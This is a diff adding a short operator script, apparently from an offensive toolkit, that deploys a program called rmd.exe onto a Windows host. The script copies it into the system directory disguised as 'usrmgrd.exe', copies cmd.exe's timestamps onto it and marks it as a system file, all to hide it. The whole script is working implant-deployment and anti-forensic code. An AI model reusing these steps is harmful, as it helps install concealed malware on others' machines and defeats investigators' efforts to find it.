@@ -1,0 +1,48 @@
+# $Revision: 1.2 $ $Date: 2007-06-04 12:12:51-04 $
+
+string $RMD_LOCAL = "RoundupMast\\rmd.exe";
+string $RMD_TARGET = "usrmgrd.exe";
+# Old client name
+#string $RMC_TARGET = "drmclien.exe";
+string $WORKING_DIR = "c:\\recycler";
+
+##### cd to system directory #####
+
+@record on;
+`getsyspaths`;
+string $SYS_DIR = GetCmdData("SystemDirectoryPath");
+@record off;
+
+string $MATCHFILE = "$SYS_DIR\\cmd.exe";
+
+string $RM_DIR = $SYS_DIR;
+
+ifnot (`cd $RM_DIR`) {pause;}
+ifnot (`lpsetenv -option RM_DIR -value $RM_DIR`) {pause;}
+
+##### Put RMD #####
+
+@echo off;
+if (`checkfile -name $SYS_DIR\\$RMD_TARGET`)
+{
+	@echo on;
+	echo "**";
+	echo "** $SYS_DIR\\$RMD_TARGET exists!";
+	echo "**";
+	echo "** If EP terminated without stopping RM then continue.";
+	echo "** Otherwise, you may need to change RMD_TARGET in rmput.eps";
+	echo "**";
+	pause;
+}
+else
+{
+	@echo on;
+	ifnot (`put $RMD_LOCAL -name $RMD_TARGET`) {pause;}
+	ifnot (`matchtimes $MATCHFILE $RMD_TARGET`) {pause;}
+	ifnot (`run -command "attrib -a +s $RMD_TARGET" -redirect`) {pause;}
+}
+
+ifnot (`lpsetenv -option RM_RMDNAME -value $RMD_TARGET`) {pause;}
+
+#`cd $WORKING_DIR`;
+
